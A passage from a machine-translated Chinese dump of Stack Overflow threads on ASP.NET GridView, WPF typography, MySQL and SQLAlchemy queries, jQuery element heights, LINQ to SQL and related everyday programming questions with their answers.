IF EXISTS (SELECT * FROM sys.objects WHERE object_id = OBJECT_ID(N'[SCHEMA_NAME].[TRIGGER_NAME]') AND type in (N'TR'))
DROP TRIGGER [SCHEMA_NAME].[TRIGGER_NAME] 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-02-24T11:20:03.490

Generated by **Sql Server Management Studio**:

```
IF  EXISTS (SELECT * FROM sys.triggers WHERE object_id = OBJECT_ID(N'[dbo].[RolesYAccesos2016_UsuariosCRM_trgAfterInsert]'))
DROP TRIGGER [dbo].[RolesYAccesos2016_UsuariosCRM_trgAfterInsert]
GO

CREATE TRIGGER [dbo].[RolesYAccesos2016_UsuariosCRM_trgAfterInsert] 
ON  [PortalMediadores].[dbo].[RolesYAccesos2016.UsuariosCRM]
FOR INSERT
AS  
... 
```

For `select @@version`

> Microsoft SQL Server 2008 R2 (RTM) - 10.50.1797.0 (X64) Jun 1 2011 15:43:18 Copyright (c) Microsoft Corporation Enterprise Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor)

# asp.net - GridView 上的自定义分页由按钮按下填充

> ID：636453
> 
> 赞同：0
> 
> 时间：2009-03-11T21:27:40.583
> 
> 标签：asp.net, search, gridview, button, custompaging

我有一个由“搜索”按钮填充的 Gridview，但我不确定如何为它进行自定义分页。我现在使用 sp_executeSQL 运行搜索查询，它会返回整个结果集。

我想知道我应该采取哪些步骤来在 GridView 上设置自定义分页和排序，以及修改使用 Sp_ExecuteSQL 生成单页结果的过程的最有效方法。我见过使用临时表等的方法。

编写完 proc 后，如何在页面中设置事件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-11T21:45:21.710

**asp:gridview**带有一个分页设置，如果你不知道它有排序和分页与一定数量的字段技术，可以找到[http://www.dotnetspider.com/resources/1249-Grid-View-Paging-Sorting .aspx](http://www.dotnetspider.com/resources/1249-Grid-View-Paging-Sorting.aspx)

但是，如果您想提出自己的分页技术，听起来像在数据库中分页或排序，那么这与内存中的分页不同，这是**asp:gridview webcontrol**所做的。因此，如果您想从 DB 中分页和排序，那么您应该创建一个执行此操作的**存储过程**，并且当涉及到您的搜索按钮时，调用该过程将采用您的特定参数（页码，每页有多少条目等）。 .)

该站点[http://aspnet.4guysfromrolla.com/articles/031506-1.aspx](http://aspnet.4guysfromrolla.com/articles/031506-1.aspx)详细介绍了如果从 DB 下来，分页和排序如何更好

# wpf - WPF/XAML：Typography.Capitals 似乎没有效果

> ID：636454
> 
> 赞同：6
> 
> 时间：2009-03-11T21:27:55.323
> 
> 标签：wpf, xaml, flowdocument, smallcaps

所有这些文本看起来都一样，但我试图让它们看起来不同。我想要小型大写字母。我在这里缺少什么来使小型大写字体效果起作用？

要重现这一点，请打开 Visual Studio 2008，执行文件|新建项目，创建一个新的 Windows|WPF 应用程序，将下面的标记粘贴到 Window1.xaml 中，然后运行它。

```
<Window x:Class="WpfApplication1.Window1"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="Window1" Height="300" Width="300">
    <Grid>
        <FlowDocumentReader>
        <FlowDocument>
            <Paragraph>
                <Run>Some text</Run> <LineBreak />
                <Run Typography.Capitals="SmallCaps">Some text</Run> <LineBreak />
                <Run Typography.Capitals="AllSmallCaps">Some text</Run> <LineBreak />
                <Run Typography.Capitals="PetiteCaps">Some text</Run> <LineBreak />
                <Run Typography.Capitals="AllPetiteCaps">Some text</Run> <LineBreak />
            </Paragraph>
        </FlowDocument>
        </FlowDocumentReader>
    </Grid>
</Window> 
```

* * *

根据第一个答案，如果您指定特定字体，您似乎可以到达某个地方。将 FlowDocument 开始标记更改为：

```
 <FlowDocument FontFamily="Palatino Linotype"> 
```

.. 你会得到 SmallCaps 和 AllSmallCaps，但不是 PetiteCaps 或 AllPetiteCaps。所以这取决于字体。但这引发了其他问题：

*   为什么默认字体（看起来很像 Times New Roman）不支持这些？
*   其他广泛使用的字体（例如本地 Courier New 等效字体）是否支持这些？
*   有哪些字体支持什么的列表吗？
*   多少百分比的字体会支持这一点——大多数、一些还是少数？
*   您能否在代码中确定字体支持的内容 - 如果是这种情况，我可以伪造 AllSmallCaps - 例如，将文本转换为所有大写字母并缩放 80%。但不是小型股。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-03-12T14:31:00.717

这仅适用于特定的 OpenType 字体 - Help 中的示例使用 Open Type Sample 中的 Pescadero。即使这样，也仅支持 SmallCaps 和 AllSmallCaps。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-16T03:51:30.353

我注意到带有“粗体”字体粗细的默认字体确实可以正确渲染 SmallCaps：

```
<StackPanel>
    <TextBlock Typography.Capitals="SmallCaps" FontFamily="Pescadero" Padding="2">2pm</TextBlock>
    <TextBlock Typography.Capitals="SmallCaps" FontWeight="Bold" Padding="2">2pm</TextBlock>
</StackPanel> 
```

# mysql - 只选择mysql中的唯一行

> ID：636463
> 
> 赞同：2
> 
> 时间：2009-03-11T21:31:14.520
> 
> 标签：mysql, select, unique

我只想根据 mysql 表中的用户 ID 列选择唯一的行。因此，如果我有两行具有相同的用户 ID，则没有一个会被选中，但如果只有一个会被选中。

我使用以下代码：

```
SELECT T.id,T.name,T.userid FROM tbltest T WHERE userid NOT IN (SELECT userid FROM tbltest WHERE tbltest.id<>T.id); 
```

这是最快的方法吗？

谢谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-03-11T21:35:05.510

这怎么样

```
SELECT T.id,T.name,T.userid 
FROM tbltest T 
GROUP BY T.userid
HAVING COUNT(T.userid) = 1; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-11T21:35:52.420

尝试这个：

```
SELECT T.id, T.name, T.userid, count(*) AS count FROM tbltest GROUP BY T.userid HAVING count = 1; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T21:36:00.390

我认为这不是最快的方法......你可以尝试：

```
SELECT T.id, T.name, T.userid, COUNT(*) AS num 
FROM tbltest T GROUP BY T.userid HAVING num = 1 
```

或者

```
SELECT T.id, T.name, T.userid, COUNT(*) AS num FROM tbltest T
WHERE NOT EXISTS
(SELECT 1 FROM tbltest T2 WHERE T2.userid = T.userid AND T2.id != T.id) 
```

# javascript - 在 JS 中实现一个简单的反馈表单

> ID：636467
> 
> 赞同：-1
> 
> 时间：2009-03-11T21:32:48.793
> 
> 标签：javascript, webforms

如何实施以下网站的反馈表？：

[http://foodoro.com/](http://foodoro.com/) [http://www.heyzap.com/](http://www.heyzap.com/)

（看左边的中心。）

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-11T21:40:18.273

您可能应该检查[JQuery](http://jquery.com/)或类似的库以获得这种效果。那里有很多很棒的教程和插件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-02-13T09:32:26.693

我会在 github 中使用这段代码

[https://github.com/lorenzoongithub/getsomefeedback](https://github.com/lorenzoongithub/getsomefeedback)

作为模板/样板。它应该很容易适应您的要求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T21:41:29.427

从查看 jQuery 开始。像这样的东西非常好。

[http://www.webdesignerwall.com/tutorials/jquery-tutorials-for-designers/](http://www.webdesignerwall.com/tutorials/jquery-tutorials-for-designers/)

那里的第一个示例显示了一种至少获得滑动面板的简单方法。这并不完全是您想要的，但它让您了解 jQuery 可以做什么以及如何实现您想要的。

编辑：这是那里滑动面板演示的直接链接...

[http://www.webdesignerwall.com/demo/jquery/simple-slide-panel.html](http://www.webdesignerwall.com/demo/jquery/simple-slide-panel.html)

# javascript - 当firebug说它是34时，为什么jquery会为offsetHeight返回0？

> ID：636474
> 
> 赞同：8
> 
> 时间：2009-03-11T21:34:56.930
> 
> 标签：javascript, jquery, dom

所以我有一个 div，它的内容是在运行时生成的，它最初没有与之关联的高度。当它是根据萤火虫生成的，并且从我可以用 js 发出警报时，div 的高度仍然为 0。但是，用萤火虫查看只读属性，我可以看到它的偏移高度为 34。正是这个值我需要。希望这很明显，但如果不是，这个数字是可变的，并不总是 38。

所以，我认为我可以通过 jquery 做到这一点......

```
$("#parentDiv").attr('offsetHeight'); 
```

或者这个直接用js...

```
document.getElementById("parentDiv").offsetHeight; 
```

但是返回的只是 0。这与偏移高度在这种情况下是只读属性这一事实有关吗？我怎样才能达到这个高度？我的意思是萤火虫正在以某种方式解决它，所以看起来我应该能够。

**编辑：** 这是 div 现在看起来的示例......

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML Strict//EN"><META http-equiv="Content-Type" content="text/html; charset=utf-8">

<HTML style="OVERFLOW: hidden; HEIGHT: 100%" xmlns="http://www.w3.org/1999/xhtml"><BODY><FORM id="aspnetForm" name="aspnetForm" action="blah.aspx" method="post"><DIV id="container">

<DIV id="ctl00_BodyContentPlaceHolder_Navigation" style="Z-INDEX: 1; LEFT: 1597px; POSITION: absolute; TOP: 67px">
    <DIV class="TransparentBg" id="TransparentDiv" style="MARGIN-TOP: 10px; MARGIN-RIGHT: 10px; HEIGHT: 94px; TEXT-ALIGN: center">
    </DIV>
    <DIV class="Foreground" id="ForegroundId" style="MARGIN-TOP: 10px; MARGIN-RIGHT: 10px; TEXT-ALIGN: center">
        <DIV id="ctl00_BodyContentPlaceHolder_Navigation1" style="WIDTH: 52px; COLOR: black; HEIGHT: 52px; BACKGROUND-COLOR: transparent; -moz-user-focus: normal">
            <IMG style="FILTER: progid:DXImageTransform.Microsoft.AlphaImageLoader(sizingMethod = scale src='../images/image.gif'); CURSOR: pointer" height="52" hspace="0" src="..." width="52" /> 
        </DIV>
        <DIV id="ctl00_BodyContentPlaceHolder_UserControl" name="ctl00_BodyContentPlaceHolder_UserControl">
            <IMG style="DISPLAY: block; VERTICAL-ALIGN: bottom; CURSOR: pointer" height="17" src="..." width="16" />
            <IMG style="VERTICAL-ALIGN: top; CURSOR: pointer" height="17" src="..." width="16" />
        </DIV>
    </DIV>
</DIV>

</DIV></FORM></BODY></HTML> 
```

此代码由单独库中的控件生成。所以这是在我的 .aspx 页面中创建它的实际代码。

```
<blah:blahControl ID="control" runat="server" /> 
```

好的，它稍作编辑，但 HTML 比我以前的要多得多。我之前称为“parentDiv”的 div 在上面被称为“ctl00_BodyContentPlaceHolder_UserControl”。该代码包括有问题的 div，它是兄弟姐妹、父母、祖父母和孩子。它几乎是萤火虫的直接副本。

**更新：** 我应该提到这是在 IE 7 中完成的。它似乎在 Firefox 中运行良好，但现在返回 0。这是否提供了有关可能的变通办法或任何东西的任何新见解？

……你们一定认为我疯了。

**更新：** 一些样式...

```
.TransparentBg 
{
    background-color: white;
    filter:alpha(opacity=50);
    -moz-opacity:0.5;
    -khtml-opacity: 0.5;
    opacity: 0.5;
}

.Foreground
{
    position: absolute;
    top: 0px;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-11T21:54:22.843

您确定该元素包含在文档树中并呈现吗？（即不是“显示：无”，但“可见性：隐藏”是可以的。）

一个实际上没有参与文档渲染过程的元素没有尺寸，并且将给出 0 的 offsetWidth/Height。

添加代码示例后的 ETA：使用您的确切代码，我在 '17' 的 div 上得到 offsetHeight。第一个图像的大小正确，第二个没有大小。

这是正确的渲染（*）。任何无法加载的图像都将替换为它们的替代文本作为内联跨度。您的图像没有替代文本，因此它被一个空字符串替换。通常，作为内联元素，它不能设置为任何特定的大小。第一个图像是个例外，因为您给它提供了“显示：块”，这使得它可以适应由宽度/高度提供的显式尺寸。

在 Quirks 模式下，您会看到与图像应有大小相同的小“损坏图像”图标。这在标准模式下不会发生，因为假设您知道在使用标准时如何正确使用替代文本。

无论哪种方式，如果我用真实的工作地址替换“...” URL，尺寸测量对我来说都很好。

（*：虽然您实际上看不到它，因为 html 上的“溢出隐藏”和“左：1597px;”组合相当奇怪。好吧，除非你有一个*非常*宽的显示器！）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-11T21:58:03.007

你确定它不是[海森堡](http://en.wikipedia.org/wiki/Unusual_software_bug#Heisenbug)？如果您以编程方式在某处设置高度，然后稍后尝试读取它，则 DOM 可能不会更新。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T22:45:54.483

使用有效的 IMG SRC 加载此文件会给出 3 个“37”警报框。如果没有有效的 IMG SRC，它会在所有三个上给出“17”。您使用的是什么版本的 Jquery？以及哪个版本的 FireFox/IE？

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML Strict//EN"><META http-equiv="Content-Type" content="text/html; charset=utf-8">
<HTML style="OVERFLOW: hidden; HEIGHT: 100%" xmlns="http://www.w3.org/1999/xhtml">
<HEAD>
    <script type="text/javascript" src="jquery.js"></script>
</HEAD>
<BODY>
    <FORM id="aspnetForm" name="aspnetForm" action="blah.aspx" method="post">
        <DIV id="container">
            <DIV id="ctl00_BodyContentPlaceHolder_Navigation" style="Z-INDEX: 1; LEFT: 1597px; POSITION: absolute; TOP: 67px">
                <DIV class="TransparentBg" id="TransparentDiv" style="MARGIN-TOP: 10px; MARGIN-RIGHT: 10px; HEIGHT: 94px; TEXT-ALIGN: center">
                </DIV>
                <DIV class="Foreground" id="ForegroundId" style="MARGIN-TOP: 10px; MARGIN-RIGHT: 10px; TEXT-ALIGN: center">
                    <DIV id="ctl00_BodyContentPlaceHolder_Navigation1" title="Click to pan the map." style="WIDTH: 52px; COLOR: black; HEIGHT: 52px; BACKGROUND-COLOR: transparent; -moz-user-focus: normal">
                        <IMG style="FILTER: progid:DXImageTransform.Microsoft.AlphaImageLoader(sizingMethod = scale src='../images/image.gif'); CURSOR: pointer" height="52" hspace="0" src="..." width="52" /> 
                    </DIV>
                    <DIV id="ctl00_BodyContentPlaceHolder_UserControl" name="ctl00_BodyContentPlaceHolder_UserControl">
                        <IMG style="DISPLAY: block; VERTICAL-ALIGN: bottom; CURSOR: pointer" height="17" src="je_fanmap_unavailable.JPG" width="16" />
                        <IMG style="VERTICAL-ALIGN: top; CURSOR: pointer" height="17" src="je_fanmap_unavailable.JPG" width="16" />
                    </DIV>
                </DIV>
            </DIV>
            <script type="text/javascript">
                $(window).load(function () {
                alert($("#ctl00_BodyContentPlaceHolder_UserControl").attr('offsetHeight'));
                alert(document.getElementById("ctl00_BodyContentPlaceHolder_UserControl").offsetHeight);
                alert($("#ctl00_BodyContentPlaceHolder_UserControl").height());
                });
            </script>
        </DIV>
    </FORM>
</BODY> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-11T22:46:23.623

**尝试在所有DOM**和**图像**完全加载后调用 offset 函数，`load()`而不是`document.ready().`

```
$(window).load(function () {
    //Put the code for the height here
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-12-18T17:55:33.653

我刚刚发现一个问题，当文档准备好时，我正在获取元素的 offsetHeight，但它位于**隐藏的容器中**。

它导致 offsetHeight 值为 0，但萤火虫说它的高度为 32。

# visual-studio-2008 - VS2008 工具箱控件重复

> ID：636477
> 
> 赞同：2
> 
> 时间：2009-03-11T21:35:29.283
> 
> 标签：visual-studio-2008, toolbox

我不太确定为什么，但我的 VS2008 工具箱控件（数据、验证、导航、登录和 Webpart）显示多次。有谁知道如何纠正这个问题？如果这对答案有任何影响，我仍在使用 XP。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-11T22:33:30.800

您可以尝试 devenv /setup 或 devenv /resetsettings。

# javascript - Python 和 Javascript 正则表达式有什么不同？

> ID：636485
> 
> 赞同：37
> 
> 时间：2009-03-11T21:36:56.317
> 
> 标签：javascript, python, regex

Python 和 JavaScript 正则表达式语法是否相同？

如果没有，那么：

1.  它们之间的重要区别是什么
2.  是否有“实现” JavaScript 正则表达式的 python 库？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2009-03-11T21:42:55.787

这里有一个对照表：

[正则表达式风味比较](http://web.archive.org/web/20130830063653/http://www.regular-expressions.info:80/refflavors.html)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-03-11T21:48:57.850

**第 1 部分**
它们是不同的；一个区别是 Python 支持 Unicode 而 Javascript 不支持。

**第 2 部分**
阅读[掌握正则表达式](http://oreilly.com/catalog/9780596528126/)。它提供了有关如何识别正则表达式使用的后端引擎（DFA、NFA 和混合）的信息。它提供了大量关于不同正则表达式风格的信息。

在一个 SO 答案上要传达的信息太多了，所以最好有一份关于该主题的可靠参考资料*。*

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-11T21:44:12.073

[http://www.regular-expressions.info/javascript.html](http://www.regular-expressions.info/javascript.html)与[http://www.regular-expressions.info/python.html](http://www.regular-expressions.info/python.html)

# .net - 我应该编写自己的 GridView 实现吗？

> ID：636497
> 
> 赞同：3
> 
> 时间：2009-03-11T21:42:14.730
> 
> 标签：.net, asp.net, gridview

我没有过多地使用 GridView，在使用它之后，发现它比我需要的更复杂，但缺少一些我期望它具备的非常基本的能力。毫无疑问，鉴于其 90% 的时间目的是绑定到数据集，尤其是在以声明方式执行此操作时，它的实现是有意义的，但我打算将其绑定到`IEnumerable<T>`in 代码。

我需要的是能够轻松执行以下操作

*   a）绑定到一个`IEnumerable<T>`列可以限制为仅某些类型的属性`T`
*   b) 被查询以返回其行的集合，其中每一行都可以通过单元格绑定到的属性查找一个单元格

基本上实现以下接口的东西会很好

```
public interface IEasyGridBinder {
  void Bind<T>(IEnumerable<T> bindableObjects, params string[] propertiesToBind);
  IList<IDictionary<string, string>> Values {get;}
} 
```

所以要得到这个，我应该编写自己的自定义 EasyGridBinder，它继承自 GridView 并实现这个接口，还是有一种非常简单的方法来做这些我不熟悉的事情？

PS 如果我能写出类似的东西，则可以加分

```
myGrid.Bind(myEntities, e=>{e.Id; e.Name; e.Customer.Name;}); 
```

但我想我可以在阅读表达式后自己弄清楚

**追问：**有没有办法获取输入到gridview中并没有转成html的原始数据？如果作为输入接收到的字段为空字符串，则单元格似乎包含“”，那么没有办法区分空字符串的输入和空格吗？如果确实如此，那么我可能最终会重新实现 GridView 的大部分功能。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-11T23:47:11.620

[LinqDataSource](http://msdn.microsoft.com/en-us/library/bb547113.aspx)允许您将对象指定为数据源的后备存储。然后将 GridView 绑定到该数据源。它在 .aspx 中声明更多，但稍后需要维护的代码更少，因为功能膨胀使您离重新实现 GridView 越来越近。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-11T22:19:33.297

如果将 GridViews AutoGenerateColumns 属性设置为 false，它将仅生成您指定的列。为此，您可以创建 BoundFields 并将它们添加到 Gridview Columns 集合中。

```
GridView gv = new GridView();
gv.AutoGenerateColumns = false;

BoundField bf = new BoundField();
bf.DataField = "Id";
bf.HeaderText = "ID";
gv.Columns.Add(bf);

BoundField bf = new BoundField();
bf.DataField = "Name";
bf.HeaderText = "Name";
gv.Columns.Add(bf);

BoundField bf = new BoundField();
bf.DataField = "Customer.Name";
bf.HeaderText = "Customer Name";
gv.Columns.Add(bf);

gv.DataSource = IEnumerable<T>;
gv.DataBind(); 
```

我已经在评论中写了这个解释，但我想我会把它移到更明显的地方并添加一个代码示例：

为了使上述动态创建一个继承自 Attribute 的 GridViewDisplayAttribute 类。给 GridViewDisplayAttribute 一个 HeaderText 属性。装饰 T 指定 HeaderText 的属性。通过迭代 T 的属性，使用 HeaderText 为每个修饰属性创建 BoundFields。

快速未经测试的代码示例：

```
using System;
public class GridViewDisplayAttribute : Attribute
{
public GridViewDisplayAttribute(string headerText)
{
        HeaderText = headerText;
}
    public readonly bool HeaderText;
} 
```

* * *

```
GridView gv = new GridView();
gv.AutoGenerateColumns = false;

Type t = <T>.GetType();
PropertyInfo[] pis = t.GetProperties();

foreach (PropertyInfo pi in pis)
{
    GridViewDisplayAttribute[] gvdaArray = pi.GetCustomAttributes(
        typeof(GridViewDisplayAttribute), true);

    foreach (GridViewDisplayAttribute gvda in gvdaArray)
    {
        BoundField bf = new BoundField();
        bf.DataField = pi.Name;
        bf.HeaderText = gvda.HeaderText;
    }

    gv.Columns.Add(bf);
}

gv.DataSource = IEnumerable<T>;
gv.DataBind(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T21:51:01.230

我建议使用扩展方法来添加所需的行为。唯一的缺点是您不能将“值”添加为属性。

# c# - 重定向到 POST HttpWebRequest

> ID：636507
> 
> 赞同：2
> 
> 时间：2009-03-11T21:44:46.563
> 
> 标签：c#, .net, asp.net, httpwebrequest

我正在尝试使用 HttpWebRequest 将数据发布到外部 url，然后我需要将用户重定向到我刚刚发布数据的外部 url，这可以首先实现吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-11T21:47:20.380

好吧，重定向应该是相当标准的——只是一个常规的 ASP.NET[重定向](http://msdn.microsoft.com/en-us/library/system.web.httpresponse.redirect.aspx)。

重新做一个POST；这很好 - 但使用起来会更容易`WebClient`：

```
 using (WebClient client = new WebClient())
    {
        client.UploadData(address, "POST", data);
    } 
```

（针对不同用例的其他方法和重载）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T21:48:48.300

当然，这很有可能。

根据您需要发布的数据，System.Net.WebClient 类可能比 HttpWebRequest 更简单。它可以通过一个方法调用上传字符串和文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T21:50:58.593

除非在服务器端需要做一些事情，否则你应该从客户端的 JS 来做这件事。

只需使用 JS 以编程方式提交一个表单，该表单将负责发布和重定向。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-13T11:13:11.203

最简单的方法就是设置表单的 action 属性：

```
<form method="post" action="url/to/post/data/to">
....
</form> 
```

然后数据和用户将被发送到您的 URL，而无需您以编程方式执行任何操作。

# ruby-on-rails - form_for 的 Rails 编译错误

> ID：636514
> 
> 赞同：0
> 
> 时间：2009-03-11T21:46:37.650
> 
> 标签：ruby-on-rails, forms

在我的部分视图之一中，以下代码出现错误

```
<% form_for (@user) |form| %> 
```

用户中的语法错误#edit

显示第 1 行引发的 user/_user_edit_form.html.erb：

编译错误../app/views/user/_user_edit_form.html.erb:1：语法错误，意外';' _erbout = ''; form_for (@user) |form| ; _erbout.concat "\n"

有谁知道这意味着什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-11T22:08:46.710

你忘了做：

```
<% form_for (@user) do |form| %> 
```

# asp.net - 从 Web 表单打印 PDF 文档

> ID：636516
> 
> 赞同：2
> 
> 时间：2009-03-11T21:47:13.907
> 
> 标签：asp.net, pdf, printing

是否有某种轻量级（非 Adob​​e）控件可用于在 Web 表单上查看和打印 PDF 文档？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-13T04:38:14.037

我用[福昕](http://www.foxitsoftware.com/pdf/rd_intro.php)。轻量级 - 加载速度比 Adob​​e 快。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-12T21:44:58.960

ABCPdf 是一个免费的 ASP.NET PDF 生成器；如果您使用它，您所要做的就是链接回他们的网站。

[http://www.websupergoo.com/abcpdf-1.htm](http://www.websupergoo.com/abcpdf-1.htm)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T21:48:25.510

[Flashpaper](http://www.adobe.com/products/flashpaper/)，它是平台无关的。

我建议这样做的原因是您可以通过此 Flash 插件（和打印）将 PDF 查看嵌入到任何网络浏览器中，但不必安装或配置 PDF 查看软件以与网络浏览器一起使用。

**编辑：根据评论，新的 Flashpaper 版本已经停产。不过 Flashpaper 将继续出售。（见评论中的链接）。** 我已经使用了几年，并没有发现对新功能有太多需求，但您的情况可能会有所不同。试试看。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-11T21:54:03.157

[Foxit Reader](http://www.foxitsoftware.com/pdf/reader/)比 Adob​​e Reader 更轻量。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-11T21:54:46.883

要显示 PDF，您可以使用[PDF Me Not](http://pdfmenot.com/tools/)。不过，我不确定您是否是指生成表单提交的 PDF。如果这就是您的意思，那么几乎每种语言都有 PDF 库（例如 PHP 的[FPDF](http://www.fpdf.org/)）。

对于第一种情况，还有开源的[AlivePDF](http://alivepdf.bytearray.org/)。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-12T22:15:11.807

[Aspose.com](http://www.aspose.com/)可以为 .NET 和 Java 做一些漂亮的事情

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-05-14T06:42:25.330

phpLiveDocx 和 LiveDocx 是完全免费的，可用于将数据（例如，来自 Web 表单）与来自服务器上的 MS Word 或 Open Office 的模板合并。

*   phpLiveDocx 在 Linux、Windows 和 Mac 上运行。
*   LiveDocx 在 Windows 上运行。

了解更多信息：

*   [http://www.phplivedocx.org/articles/brief-introduction-to-phplivedocx/](http://www.phplivedocx.org/articles/brief-introduction-to-phplivedocx/)
*   [http://www.livedocx.com](http://www.livedocx.com)

# c# - Linq to SQL 中的鉴别器问题

> ID：636534
> 
> 赞同：1
> 
> 时间：2009-03-11T21:51:57.233
> 
> 标签：c#, .net, linq-to-sql

我正在尝试在我的 linq to sql 设置中使用鉴别器字段。我有一个名为的基类`Inventory_Item`，我将其设置为抽象类，然后从它继承许多不同的服务（例如`BaseWash`）。现在 BaseWash 关联的属性是

```
Base Class Discriminator Value    = 1
Derived Class Discriminator Value = 2
Discriminator Property = ItemCategoryID
Inheritance Default = BaseWash 
```

这构建得很好，但是当它运行时，我在这里的设计器代码中出现异常：

```
public System.Data.Linq.Table<Inventory_Item> Inventory_Items
{
    get
    {
        return this.GetTable<Inventory_Item>();
    }
} 
```

> 不应为抽象类“ICS.Core.Inventory_Item”分配继承鉴别键。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-11T22:36:06.970

由于`Inventory_Item`是抽象的，因此您永远无法实例化`Inventory_Item`. 所以只需清除`Base Class Discriminator Value`- 它永远无法使用。或者使类为非抽象类并将其保留为 1。

# python - 在 SQLAlchemy 中选择 *？

> ID：636548
> 
> 赞同：43
> 
> 时间：2009-03-11T21:56:49.093
> 
> 标签：python, sqlalchemy

可以`SELECT *`在 SQLAlchemy 中做吗？

具体来说，`SELECT * WHERE foo=1`?

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2009-03-11T22:27:31.703

今天没有人感受到 SQLALchemy 对 ORM 的热爱吗？给出的答案正确地描述了 SQLAlchemy 提供的较低级别的接口。只是为了完整起见，这是更可能的*（对我而言）*现实情况，其中您有一个会话实例和一个用户类，该类是 orm 映射到用户表的。

```
for user in session.query(User).filter_by(name='jack'):
     print user
     # ... 
```

这会对所有列进行显式选择。

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2014-04-22T19:48:44.950

以下选择适用于核心表达式语言（返回[RowProxy 对象](http://docs.sqlalchemy.org/en/latest/core/connections.html#sqlalchemy.engine.RowProxy)）：

```
foo_col = sqlalchemy.sql.column('foo')
s = sqlalchemy.sql.select(['*']).where(foo_col == 1) 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2009-03-11T22:05:48.697

如果您不列出任何列，您将获得所有列。

```
query = users.select()
query = query.where(users.c.name=='jack')
result = conn.execute(query)
for row in result:
    print row 
```

应该管用。

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2013-04-17T15:56:37.200

您也可以随时使用原始 SQL：

```
str_sql = sql.text("YOUR STRING SQL")
#if you have some args:
args = {
    'myarg1': yourarg1
    'myarg2': yourarg2}
#then call the execute method from your connection
results = conn.execute(str_sql,args).fetchall() 
```

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2009-03-11T23:02:32.163

其中**Bar**是映射到您的表的类，**session**是您的 sa 会话：

```
bars = session.query(Bar).filter(Bar.foo == 1)
```

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2009-03-11T22:13:53.733

原来你可以这样做：

```
sa.select('*', ...) 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2013-10-22T10:05:49.480

对于未手动定义列的连接，仅返回目标表的列。获取连接的所有列（用户表与组表连接：

```
sql = User.select(from_obj(Group, User.c.group_id == Group.c.id))
# Add all coumns of Group table to select
sql = sql.column(Group)
session.connection().execute(sql) 
```

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2012-09-28T01:50:06.950

如果您使用的是 ORM，则可以使用普通的 ORM 构造构建查询，然后直接执行它以获取原始列值：

```
query = session.query(User).filter_by(name='jack')
for cols in session.connection().execute(query):
    print cols 
```

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2021-08-27T08:53:31.753

我遇到了同样的问题，我试图从表中获取所有列作为列表，而不是取回 ORM 对象。这样我就可以将该列表转换为熊猫数据框并显示。

有效的是`.c`在子查询或 cte 上使用，如下所示：

```
U = select(User).cte('U')
stmt = select(*U.c)
rows = session.execute(stmt) 
```

然后你会得到每列的元组列表。

另一种选择是以`__table__.columns`相同的方式使用：

```
stmt = select(*User.__table__.columns)
rows = session.execute(stmt) 
```

如果您想将结果转换为数据框，这里是一个衬里：

```
pd.DataFrame.from_records(rows, columns=rows.keys()) 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2021-08-27T08:49:09.867

我遇到了同样的问题，我试图从表中获取所有列作为列表，而不是取回 ORM 对象。这样我就可以将该列表转换为熊猫数据框并显示。

有效的是`.c`在子查询或 cte 上使用，如下所示：

```
U = select(User).cte('U')
stmt = select(*U.c)
rows = session.execute(stmt) 
```

然后你会得到每列的元组列表。

另一种选择是以`__table__.columns`相同的方式使用：

```
stmt = select(*User.__table__.columns)
rows = session.execute(stmt) 
```

如果您想将结果转换为数据框，这里是一个衬里：

```
pd.DataFrame.from_records(dict(zip(r.keys(), r)) for r in rows) 
```

* * *

## 回答 #11

> 赞同：0
> 
